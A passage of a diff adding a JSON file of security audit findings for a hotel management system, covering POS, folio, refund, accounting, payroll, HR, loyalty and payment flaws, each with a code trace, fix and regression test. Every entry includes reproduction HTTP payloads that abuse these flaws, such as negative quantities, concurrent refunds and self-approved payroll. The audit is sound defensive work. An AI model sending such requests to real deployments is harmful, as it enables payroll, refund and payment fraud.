+      "payloads": ["POST /api/v1/booking/{group}/reservations/{conf}/payments?token=... {\"provider\":\"mtn_momo\"}", "GET /api/v1/booking/{group}/reservations/{conf}/payments/{reference}?token=..."],
+      "instructions": ["Create a deposit intent on the public API", "Poll the status endpoint once"],
+      "expected_result": "status 'succeeded'; deposit_paid incremented and a folio payment line posted although no provider was called"
+    },
+    "blockers": ["Decisive fact is deployment: whether any internet-facing instance that takes real bookings runs with APP_ENV != 'production' (staging/UAT/demo). In source the production gate is present and correct for APP_ENV=production."],
+    "rejection_reason": null,
+    "smallest_fix": "Replace the APP_ENV test with an explicit config flag payments.dry_run (default false) that must be set on purpose; refuse to create or settle dry_run intents on the public channel when the flag is off; log loudly at boot when it is on.",
+    "regression_test": "Follow tests/Feature/Payments/PaymentsTest.php: with app env 'staging' and no gateway credentials, public deposit create -> 422 'gateway-not-configured' and no payment_intents row with driver 'dry_run'."
+  },
+  {
+    "fingerprint": "business-logic:pos:sync-bypasses-line-and-payment-validation",
+    "verdict": "confirmed",
+    "severity": "medium",
+    "likelihood": "medium",
+    "impact": "medium",
+    "trace": [
+      {"kind": "entrypoint", "file": "app/Modules/POS/Http/PosController.php", "line": 138, "scope": "PosController::sync", "description": "POST /api/v1/pos/sync, guard can() = pos.view/pos.manage; 'checks.*.items.*.quantity' => ['sometimes','numeric'] (line 149, no min) and 'checks.*.payments' => ['nullable','array'] (line 151, no element rules)"},
+      {"kind": "propagation", "file": "app/Modules/POS/Http/PosController.php", "line": 166, "scope": "PosController::sync", "description": "each item passed straight to pos->addItem($check, menu_item_id, quantity)"},
+      {"kind": "propagation", "file": "app/Modules/POS/Application/PosService.php", "line": 68, "scope": "PosService::addItem", "description": "line created with 'quantity' => $qty and 'amount' => (int) round(($base+$extra)*$qty) - negative/zero qty gives a negative/zero amount"},
+      {"kind": "propagation", "file": "app/Modules/POS/Domain/Check.php", "line": 54, "scope": "Check::recalculate", "description": "subtotal = sum(amount) of non-voided lines; total = max(0, subtotal - comp - discount) - negative lines lower the total without pos.discount/pos.void"},
+      {"kind": "propagation", "file": "app/Modules/POS/Http/PosController.php", "line": 172, "scope": "PosController::sync", "description": "raw payments array handed to pos->settle"},
+      {"kind": "sink", "file": "app/Modules/POS/Application/PosService.php", "line": 201, "scope": "PosService::settle", "description": "only sum(amount) === total is checked (line 185-187); each payment row (including negative amounts) is stored in pos_payments and finish() posts the sale"}
+    ],
+    "evidence": [
+      {"file": "app/Modules/POS/Http/PosController.php", "line": 51, "description": "Online addItem enforces quantity min:0.001"},
+      {"file": "app/Modules/POS/Http/PosController.php", "line": 110, "description": "Online settle enforces payments.*.method required and payments.*.amount integer min:1"},
+      {"file": "app/Modules/POS/Http/PosController.php", "line": 127, "description": "voidCheck requires pos.void - the supervisor control that negative lines bypass"}
+    ],
+    "conditions": [
+      {"kind": "authorization_role", "description": "Any user passing PosController::can (pos.manage e.g. pos-cashier role)"},
+      {"kind": "data_state", "description": "Open cashier shift for cash/card/mobile tenders (PosService line 194-196)"}
+    ],
+    "reproduction": {
+      "attacker_perspective": "POS cashier without pos.void/pos.discount",
+      "payloads": ["POST /api/v1/pos/sync {\"checks\":[{\"client_uuid\":\"<uuid>\",\"outlet_id\":1,\"items\":[{\"menu_item_id\":5,\"quantity\":1},{\"menu_item_id\":5,\"quantity\":-0.9}],\"payments\":[{\"method\":\"CASH\",\"amount\":500}]}]}", "payments [{\"method\":\"CASH\",\"amount\":10000},{\"method\":\"CASH\",\"amount\":-9500}]"],
+      "instructions": ["Open a cashier shift", "Send the sync payload", "Inspect pos_checks.total and pos_payments"],
+      "expected_result": "Check synced and settled for 500 while a 5000 item was served; or pos_payments contains a -9500 row"
+    },
+    "blockers": [],
+    "smallest_fix": "In sync() apply the same rules as addItem/settle: 'checks.*.items.*.quantity' => ['sometimes','numeric','min:0.001'], 'checks.*.payments.*.method' => ['required','string'], 'checks.*.payments.*.amount' => ['required','integer','min:1']; additionally reject qty <= 0 in PosService::addItem.",
+    "regression_test": "Follow tests/Feature/POS/PosExtrasTest.php: POST /api/v1/pos/sync with an item quantity -1 and a payment amount -100 -> assertStatus(422)."
+  },
+  {
+    "fingerprint": "business-logic:folio:transfer-bypasses-city-ledger-credit-limit-and-sign",
+    "verdict": "confirmed",
+    "severity": "medium",
+    "likelihood": "medium",
+    "impact": "medium",
+    "trace": [
+      {"kind": "entrypoint", "file": "app/Modules/FrontOffice/Http/FolioController.php", "line": 111, "scope": "FolioController::transfer", "description": "POST /api/v1/folios/{folio}/transfer with folios.manage; 'to_folio_id' => integer, 'amount' => ['required','integer'] (line 114, no min, no sign check); to-folio loaded with Folio::findOrFail (tenant-scoped, any kind)"},
+      {"kind": "propagation", "file": "app/Modules/FrontOffice/Application/FolioService.php", "line": 159, "scope": "FolioService::transfer", "description": "only amount === 0 or same folio rejected; both folios merely need to be open"},
+      {"kind": "sink", "file": "app/Modules/FrontOffice/Application/FolioService.php", "line": 163, "scope": "FolioService::transfer", "description": "posts transfer_out(-amount) on from and transfer_in(+amount) on to - into any open folio including kind 'city_ledger', with no balance, credit-limit or city_ledger-approval check"}
+    ],
+    "evidence": [
+      {"file": "app/Modules/FrontOffice/Application/FolioService.php", "line": 172, "description": "transferToCityLedger() enforces company->city_ledger (line 172) and credit_limit (line 176-178) - the control transfer() bypasses"},
+      {"file": "app/Modules/FrontOffice/Application/FolioService.php", "line": 131, "description": "reverse() refuses to void transfer lines ('Transfers are corrected by transferring back'), so an erroneous transfer is not caught by the void control either"}
+    ],
+    "conditions": [
+      {"kind": "authorization_role", "description": "folios.manage (receptionist role has it)"},
+      {"kind": "data_state", "description": "An open city_ledger folio for the target company exists (created by any earlier direct bill), or any second open folio for the negative-amount variant"}
+    ],
+    "reproduction": {
+      "attacker_perspective": "Receptionist with folios.manage",
+      "payloads": ["POST /api/v1/folios/{guestFolio}/transfer {\"to_folio_id\":<city ledger folio of over-limit company>,\"amount\":500000}", "POST /api/v1/folios/{victimFolio}/transfer {\"to_folio_id\":<attacker's guest folio>,\"amount\":-50000}"],
+      "instructions": ["Find an open city_ledger folio id via GET /api/v1/folios", "Transfer the guest balance into it", "Or transfer a negative amount to pull credit onto another folio, then refund/check-out"],
+      "expected_result": "200 with two transfer lines; the company's receivable exceeds credit_limit (or a non-approved company is billed); the negative variant leaves the attacker's folio in credit"
+    },
+    "blockers": [],
+    "smallest_fix": "In FolioService::transfer(): require $amount > 0 (validate 'amount' => 'integer|min:1' in the controller), and throw when $to->kind === 'city_ledger' unless called from transferToCityLedger (pass an internal flag).",
+    "regression_test": "Follow tests/Feature/FrontOffice/StayLifecycleTest.php: transfer -5000 from A to B -> 422; transfer 5000 from a guest folio to a city-ledger folio of a company with credit_limit 1000 -> 422 'credit-limit'."
+  },
+  {
+    "fingerprint": "race:folio:refund-check-on-stale-balance",
+    "verdict": "confirmed",
+    "severity": "medium",
+    "likelihood": "low",
+    "impact": "medium",
+    "trace": [
+      {"kind": "entrypoint", "file": "app/Modules/FrontOffice/Http/FolioController.php", "line": 94, "scope": "FolioController::refund", "description": "POST /api/v1/folios/{folio}/refunds with folios.adjust; amount integer min:1"},
+      {"kind": "propagation", "file": "app/Modules/FrontOffice/Application/FolioService.php", "line": 111, "scope": "FolioService::refund", "description": "if ($folio->balance > -$amount) throw - evaluated on the route-bound, unlocked Folio instance outside any transaction"},
+      {"kind": "propagation", "file": "app/Modules/FrontOffice/Application/FolioService.php", "line": 238, "scope": "FolioService::post", "description": "Folio::lockForUpdate()->findOrFail only inside post(); balance not re-validated under the lock"},
+      {"kind": "sink", "file": "app/Modules/FrontOffice/Application/FolioService.php", "line": 246, "scope": "FolioService::post", "description": "$folio->increment('balance', $record->amount) - second concurrent refund also passes and the folio goes into debit"}
+    ],
+    "evidence": [
+      {"file": "app/Platform/ModuleServiceProvider.php", "line": 47, "description": "'idempotent' middleware exists but only de-duplicates requests carrying the same Idempotency-Key; two distinct keys race freely"}
+    ],
+    "conditions": [
+      {"kind": "authorization_role", "description": "folios.adjust (front-office-manager) plus an open cashier shift for the method"},
+      {"kind": "timing_dependency", "description": "Two refund requests must interleave between the balance check and post()"}
+    ],
+    "reproduction": {
+      "attacker_perspective": "Front-office manager with folios.adjust refunding a guest with a 10000 credit",
+      "payloads": ["2x concurrent POST /api/v1/folios/{id}/refunds {\"method\":\"CASH\",\"amount\":10000,\"reason\":\"x\"} with different Idempotency-Key values"],
+      "instructions": ["Create a folio with balance -10000", "Fire both requests in parallel", "Read folios.balance"],
+      "expected_result": "Both return 201; balance ends at +10000 (20000 paid out against a 10000 credit)"
+    },
+    "blockers": [],
+    "smallest_fix": "Wrap refund() in DB::transaction, re-read the folio with lockForUpdate() before the balance comparison (or move the check into post() for type === 'refund').",
+    "regression_test": "Follow tests/Feature/FrontOffice/StayLifecycleTest.php: simulate the race by calling FolioService::refund twice where the second call uses a stale Folio instance loaded before the first refund; assert DomainException and final balance 0."
+  },
+  {
+    "fingerprint": "authz:accounting:manual-entry-self-approved-and-reverse-system-entries",
+    "verdict": "confirmed",
+    "severity": "low",
+    "likelihood": "medium",
+    "impact": "medium",
+    "trace": [
+      {"kind": "entrypoint", "file": "app/Modules/Accounting/Http/AccountingController.php", "line": 75, "scope": "AccountingController::postManual", "description": "POST /api/v1/accounting/entries requires accounting.post_manual; journal free string max:10, any date in an open period"},
+      {"kind": "propagation", "file": "app/Modules/Accounting/Http/AccountingController.php", "line": 96, "scope": "AccountingController::postManual", "description": "meta ['source_type'=>'manual','approved_by'=>$request->user()->id] - poster recorded as approver (same in Core/ManualEntries.php line 28)"},
+      {"kind": "propagation", "file": "app/Modules/Accounting/Application/Ledger.php", "line": 91, "scope": "Ledger::post", "description": "'approved_by' => $meta['approved_by'] stored with no distinct-user check"},
+      {"kind": "propagation", "file": "app/Modules/Accounting/Http/AccountingController.php", "line": 103, "scope": "AccountingController::reverse", "description": "reverse endpoint only checks accounting.post_manual"},
+      {"kind": "sink", "file": "app/Modules/Accounting/Application/Ledger.php", "line": 121, "scope": "Ledger::reverse", "description": "reverses any entry (folio, payroll, stock, payment source types) by posting mirrored lines; only already-reversed/reversal entries are refused (line 123)"}
+    ],
+    "evidence": [
+      {"file": "database/seeders/RolesAndPermissionsSeeder.php", "line": 24, "description": "accounting.post_manual is a SPECIAL permission granted to accountant and finance-director: the design treats the holder as authorised to post; no approver role or four-eyes rule for journal entries exists anywhere in source (grep approve in app/Modules/Accounting shows only payables approval)"},
+      {"file": "app/Modules/Accounting/Application/Ledger.php", "line": 114, "description": "AuditTrail::record('posted'...) and 'reversed' (line 135) - every action is attributed to the actor"}
+    ],
+    "conditions": [
+      {"kind": "authorization_role", "description": "accounting.post_manual"},
+      {"kind": "data_state", "description": "Target period open / year not locked"}
+    ],
+    "reproduction": {
+      "attacker_perspective": "Accountant hiding a cash shortage",
+      "payloads": ["POST /api/v1/accounting/entries {\"journal\":\"OD\",\"date\":\"<today>\",\"description\":\"adj\",\"lines\":[{\"account\":\"571\",\"debit\":100000},{\"account\":\"706\",\"credit\":100000}]}", "POST /api/v1/accounting/entries/{id of payment entry}/reverse {\"reason\":\"x\"}"],
+      "instructions": ["Post the manual entry", "Reverse the automatic treasury entry of a payment"],
+      "expected_result": "Entries posted with approved_by = the poster; GL no longer agrees with the folio subledger; everything is in the audit trail under the poster's id"
+    },
+    "blockers": [],
+    "smallest_fix": "Store approved_by null on manual posts and add an explicit approve step requiring a different user with a new accounting.approve permission; restrict Ledger::reverse via the API to source_type in ['manual','reversal'] (system entries are corrected through their source document).",
+    "regression_test": "Follow tests/Feature/Accounting/CoreLockingAuditTest.php: post a manual entry and assert approved_by is null; reverse an entry with source_type 'folio' -> assertStatus(422)."
+  },
+  {
+    "fingerprint": "authz:payroll:sod-check-only-against-original-creator",
+    "verdict": "confirmed",
+    "severity": "medium",
+    "likelihood": "medium",
+    "impact": "high",
+    "trace": [
+      {"kind": "entrypoint", "file": "app/Modules/HR/Http/PayrollController.php", "line": 31, "scope": "PayrollController::compute", "description": "POST /api/v1/payroll/runs with payroll.manage; 'inputs.*.bonuses' integer min:0 with no max (line 37)"},
+      {"kind": "propagation", "file": "app/Modules/HR/Application/PayrollService.php", "line": 51, "scope": "PayrollService::compute", "description": "PayrollRun::firstOrCreate(['period'], ['prepared_by' => actor]) - prepared_by is set once by whoever created the draft and never updated on recompute"},
+      {"kind": "propagation", "file": "app/Modules/HR/Application/PayrollService.php", "line": 55, "scope": "PayrollService::compute", "description": "payslips deleted and rebuilt with the new inputs; bonuses/service_charge flow into net (line 70)"},
+      {"kind": "propagation", "file": "app/Modules/HR/Application/PayrollService.php", "line": 94, "scope": "PayrollService::approve", "description": "refuses only when prepared_by === actor ('sod')"},
+      {"kind": "sink", "file": "app/Modules/HR/Application/PayrollService.php", "line": 105, "scope": "PayrollService::approve", "description": "run approved by the user who actually set the amounts; GL posting and PayoutService payment follow"}
+    ],
+    "evidence": [
+      {"file": "app/Modules/HR/Application/PayrollService.php", "line": 95, "description": "Explicit intended control: 'The payroll must be approved by someone other than the preparer.'"},
+      {"file": "database/seeders/RolesAndPermissionsSeeder.php", "line": 30, "description": "general-manager and group-owner hold '*' (payroll.manage + payroll.approve); payroll-officer has payroll.manage only, so the pattern officer-creates / manager-recomputes-and-approves is realistic"}
+    ],
+    "conditions": [
+      {"kind": "authorization_role", "description": "Approver also holds payroll.manage (GM, group-owner or a custom HR-manager role)"},
+      {"kind": "data_state", "description": "Another user created the draft run for the period first; hotel has not enabled payroll_review_required (PayrollChecks line 98)"}
+    ],
+    "reproduction": {
+      "attacker_perspective": "General manager who is also an employee, after the payroll officer created the monthly draft",
+      "payloads": ["POST /api/v1/payroll/runs {\"period\":\"2026-11\",\"inputs\":{\"<own employee id>\":{\"bonuses\":5000000}}}", "POST /api/v1/payroll/runs/{id}/approve"],
+      "instructions": ["Recompute the existing draft with the bonus input", "Approve it"],
+      "expected_result": "Approval succeeds (prepared_by is still the officer); net pay inflated, GL posted, payout run created"
+    },
+    "blockers": [],
+    "smallest_fix": "Set prepared_by = actor on every compute (and keep last_computed_by), and in approve() refuse when either equals the actor; optionally cap manual bonus inputs or force payroll_review_required when inputs changed.",
+    "regression_test": "Extend tests/Feature/HR/PayrollWorkflowTest.php: A computes, B recomputes with inputs, B approves -> expect DomainException 'sod' / 422."
+  },
+  {
+    "fingerprint": "authz:hr:self-modification-of-own-salary-bank-and-advances",
+    "verdict": "confirmed",
+    "severity": "medium",
+    "likelihood": "medium",
+    "impact": "high",
+    "trace": [
+      {"kind": "entrypoint", "file": "app/Modules/HR/Http/HrController.php", "line": 96, "scope": "HrController::updateEmployee", "description": "PATCH /api/v1/hr/employees/{employee} with hr.manage; base_salary, payment_method, bank_account, momo_number accepted (line 101-102); no check that $employee->user_id !== actor"},
+      {"kind": "propagation", "file": "app/Modules/HR/Application/HrService.php", "line": 130, "scope": "HrService::updateEmployee", "description": "$e->update($data) and active contract base_salary updated (line 132)"},
+      {"kind": "propagation", "file": "app/Modules/HR/Http/HrController.php", "line": 187, "scope": "HrController::grantAdvance", "description": "payroll.manage creates a SalaryAdvance for any employee including themselves, no SoD, no cap (line 190)"},
+      {"kind": "propagation", "file": "app/Modules/HR/SelfService/SelfService.php", "line": 90, "scope": "SelfService::decide (via TalentController::decideRequest line 432)", "description": "approving a bank_change/momo_change request writes the payload to the employee with no requester != decider check"},
+      {"kind": "sink", "file": "app/Modules/HR/Application/PayrollService.php", "line": 68, "scope": "PayrollService::compute", "description": "base_salary feeds proratedBase; PayoutService pays to employee.bank_account/momo_number"}
+    ],
+    "evidence": [
+      {"file": "app/Modules/HR/Application/Lifecycle/LifecycleService.php", "line": 323, "description": "assertSod(): refuses when requester === actor or when the subject employee's user_id === actor (line 329) - explicit intended control for compensation changes, absent on the direct paths"},
+      {"file": "database/seeders/RolesAndPermissionsSeeder.php", "line": 49, "description": "hr-officer => hr.manage, payroll-officer => payroll.manage: ordinary roles reach these endpoints"}
+    ],
+    "conditions": [
+      {"kind": "authorization_role", "description": "hr.manage (salary/bank), payroll.manage (advances) or talent.requests (self-service decisions)"},
+      {"kind": "data_state", "description": "Actor's user is linked to an Employee row in the same hotel"}
+    ],
+    "reproduction": {
+      "attacker_perspective": "HR officer who is also an employee",
+      "payloads": ["PATCH /api/v1/hr/employees/{own id} {\"base_salary\":2000000,\"payment_method\":\"mobile_money\",\"momo_number\":\"6xxxxxxxx\"}", "POST /api/v1/hr/employees/{own id}/advances {\"amount\":1000000,\"monthly_deduction\":1}"],
+      "instructions": ["Find own employee id via GET /api/v1/hr/employees", "Send the PATCH / advance request"],
+      "expected_result": "200/201; next payroll pays the raised salary to the attacker-chosen destination; advance recovered at 1 per month"
+    },
+    "blockers": [],
+    "smallest_fix": "Reuse LifecycleService::assertSod semantics: in updateEmployee (when salary/bank/momo/payment_method keys are present), grantAdvance and SelfService::decide, throw DomainException('sod') when $employee->user_id === actor->id or request->employee's user_id === actor->id.",
+    "regression_test": "Extend tests/Feature/HR/SelfServiceTest.php / HrExtrasTest.php: user linked to employee E with hr.manage PATCHes own base_salary -> 422; payroll.manage grants self an advance -> 422; talent.requests user approves own bank_change -> 422."
+  },
+  {
+    "fingerprint": "business-logic:loyalty:unbounded-manual-point-credit",
+    "verdict": "confirmed",
+    "severity": "low",
+    "likelihood": "low",
+    "impact": "medium",
+    "trace": [
+      {"kind": "entrypoint", "file": "app/Modules/Loyalty/Http/LoyaltyController.php", "line": 96, "scope": "LoyaltyController::adjust", "description": "POST /api/v1/loyalty/members/{member}/adjust requires loyalty.adjust_points; points integer not_in:0, reason string max:255 (line 99) - no max"},
+      {"kind": "propagation", "file": "app/Modules/Loyalty/Application/LoyaltyService.php", "line": 171, "scope": "LoyaltyService::adjust", "description": "positive branch skips the lock/limit logic of the negative branch and calls credit()"},
+      {"kind": "sink", "file": "app/Modules/Loyalty/Application/LoyaltyService.php", "line": 185, "scope": "LoyaltyService::adjust -> credit (line 227)", "description": "points added to the membership; redeemOnFolio (line 141) and PosLoyalty::redeemTender convert them to folio/POS tender"}
+    ],
+    "evidence": [
+      {"file": "database/seeders/RolesAndPermissionsSeeder.php", "line": 25, "description": "loyalty.adjust_points is a SPECIAL permission not granted to any default role except '*' holders - it is by design the supervisor override; every adjustment records user_id (LoyaltyService line 182)"}
+    ],
+    "conditions": [
+      {"kind": "authorization_role", "description": "loyalty.adjust_points plus loyalty.manage or POS access to redeem"}
+    ],
+    "reproduction": {
+      "attacker_perspective": "Manager with loyalty.adjust_points colluding with a member",
+      "payloads": ["POST /api/v1/loyalty/members/{id}/adjust {\"points\":1000000,\"reason\":\"goodwill\"}"],
+      "instructions": ["Credit the points", "Member pays a folio or bar check with points"],
+      "expected_result": "Points credited and redeemable; loyalty liability created without a sale (attributed to the actor in loyalty_transactions)"
+    },
+    "blockers": [],
+    "smallest_fix": "Add a program-level per-adjustment cap (e.g. Program.max_manual_adjustment) above which a second approver is required, and emit a loyalty.points_adjusted event for alerting.",
+    "regression_test": "Follow tests/Feature/Loyalty/LoyaltyTiersTest.php: adjust +10,000,000 as a single user -> 422 above the configured cap."
+  },
+  {
+    "fingerprint": "business-logic:payments:dry-run-gateway-auto-succeeds-outside-production-env",
+    "verdict": "needs_validation",
+    "severity": null,
+    "likelihood": "low",
+    "impact": "high",
+    "trace": [
+      {"kind": "entrypoint", "file": "app/Modules/Payments/Http/PublicPayLinkController.php", "line": 50, "scope": "PublicPayLinkController::status", "description": "GET /pay/{code}/{sig}/intents/{reference} -> payments->refresh (line 56); PublicPaymentController::status (line 55-61) is the booking-site twin"},
+      {"kind": "propagation", "file": "app/Modules/Payments/Application/PaymentService.php", "line": 59, "scope": "PaymentService::driverOf", "description": "intent->driver === 'dry_run' ? new DryRunGateway : driverFor(...) (driverFor falls back to DryRun when no credentials and !isProduction, line 42-46)"},
+      {"kind": "propagation", "file": "app/Modules/Payments/Application/Drivers/DryRunGateway.php", "line": 37, "scope": "DryRunGateway::status", "description": "returns 'succeeded' for any intent"},
+      {"kind": "sink", "file": "app/Modules/Payments/Application/PaymentService.php", "line": 224, "scope": "PaymentService::settle", "description": "folio payment posted / PayLinkService::apply (line 217) and deposit_paid incremented (line 230-231) without funds"}
+    ],
+    "evidence": [
+      {"file": "app/Modules/Payments/Application/PaymentService.php", "line": 42, "description": "production gate present: DomainException 'gateway-not-configured' when app()->isProduction()"},
+      {"file": "app/Modules/Payments/Application/Payouts/PayoutService.php", "line": 82, "description": "same env-based fallback for disbursements"}
+    ],
+    "conditions": [
+      {"kind": "system_configuration", "description": "APP_ENV !== 'production' on an operational, internet-facing instance; or an intent stored with driver='dry_run' that remains pending after the env was switched to production"}
+    ],
+    "reproduction": {
+      "attacker_perspective": "Anonymous payer holding a pay-link URL",
+      "payloads": ["POST /pay/{code}/{sig} {\"provider\":\"mtn_momo\",\"payer_phone\":\"6xxxxxxxx\"}", "GET /pay/{code}/{sig}/intents/{reference}"],
+      "instructions": ["Start the payment", "Poll the status endpoint"],
+      "expected_result": "'succeeded' and the pay link / folio marked paid"
+    },
+    "blockers": ["Same blocker as public:paylink:dryrun-autosucceed-nonprod (duplicate finding): whether any live instance runs with APP_ENV != 'production'. The driver='dry_run' persistence path only matters if such an intent was created before the switch to production, which is also a deployment-history question."],
+    "rejection_reason": null,
+    "smallest_fix": "Explicit payments.dry_run config flag (default false) instead of the APP_ENV test; in driverOf(), refuse to settle a dry_run intent (mark it failed) when the flag is off; same for PayoutService.",
+    "regression_test": "Follow tests/Feature/Payments/PayLinksTest.php: with env 'staging' and no credentials, pay-link intent creation -> 422 and status poll of a pre-existing dry_run intent in production mode -> 'failed', no folio line."
+  },
+  {
+    "fingerprint": "retention:guests:erasure-does-not-cover-financial-and-payment-copies-of-personal-data",
+    "verdict": "confirmed",
+    "severity": "low",
+    "likelihood": "high",
+    "impact": "low",
+    "trace": [
+      {"kind": "entrypoint", "file": "app/Modules/Guests/Application/PrivacyService.php", "line": 79, "scope": "PrivacyService::anonymise", "description": "approved erasure request blanks guests (line 82), guest_register_entries (line 90-107), company_contacts (line 112) and activity_log (line 116) only - exactly what the docblock at line 78 promises"},
+      {"kind": "propagation", "file": "app/Modules/FrontOffice/Application/FolioService.php", "line": 50, "scope": "FolioService::guestFolioFor", "description": "folios.name = guest full_name + reservation number at creation and never blanked"},
+      {"kind": "propagation", "file": "app/Modules/Payments/Http/PublicPaymentController.php", "line": 48, "scope": "PublicPaymentController::create", "description": "payer_phone / payer_email copied into payment_intents and kept"},
+      {"kind": "sink", "file": "app/Modules/FrontOffice/Application/FolioService.php", "line": 216, "scope": "FolioService::invoice", "description": "invoices.bill_to_name/address copied from folio/company; online_checkins (BookingEngineController line 170+) and reservations.special_requests also untouched"}
+    ],
+    "evidence": [
+      {"file": "app/Modules/Guests/Application/PrivacyService.php", "line": 78, "description": "Docblock scopes anonymise() to profile, register and company contacts - the code matches its own stated scope; the gap is between that scope and a full-erasure expectation"},
+      {"file": "tests/Feature/Guests/DataProtectionTest.php", "line": 1, "description": "Existing test covers the guest row; extend for folios/intents"}
+    ],
+    "conditions": [
+      {"kind": "data_state", "description": "Guest had a stay with folio, invoice, online payment or online check-in"},
+      {"kind": "authorization_role", "description": "Any later staff reader of folios/payment_intents/online_checkins"}
+    ],
+    "reproduction": {
+      "attacker_perspective": "Staff user searching after an approved erasure",
+      "payloads": ["GET /api/v1/folios?search=<old name>", "GET /api/v1/payments/intents?phone=<old phone>"],
+      "instructions": ["Create guest with reservation, folio, invoice, intent", "Approve a delete request with a second user", "Search folios / intents / online_checkins"],
+      "expected_result": "Original name/phone/email still visible in folios.name, payment_intents.payer_*, payment_links.payer_phone, online_checkins and reservation free text"
+    },
+    "blockers": [],
+    "smallest_fix": "Extend anonymise() to blank folios.name, payment_intents.payer_phone/payer_email, payment_links.payer_phone, online_checkins document fields and reservations.special_requests/notes for the guest; keep invoices (legal retention) but document that in the request decision note.",
+    "regression_test": "Extend tests/Feature/Guests/DataProtectionTest.php: after approval assert no folio, payment_intent, payment_link, online_checkin or reservation row for the guest contains the original name, phone or email."
+  }
+]
